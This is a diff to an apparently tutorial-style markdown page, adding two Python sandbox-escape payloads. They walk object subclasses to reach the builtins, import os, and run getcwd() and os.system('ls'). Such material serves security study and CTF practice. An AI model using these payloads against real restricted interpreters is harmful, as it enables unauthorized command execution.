@@ -187,3 +187,11 @@ for file_index in range(0,ndir):                             # This will be on a
 
 ![Number of files in current working directory](../../.gitbook/assets/image%20%28154%29.png)
 
+```text
+# Get present working directory
+().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').getcwd()
+
+# Execute ls
+().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
+```
+
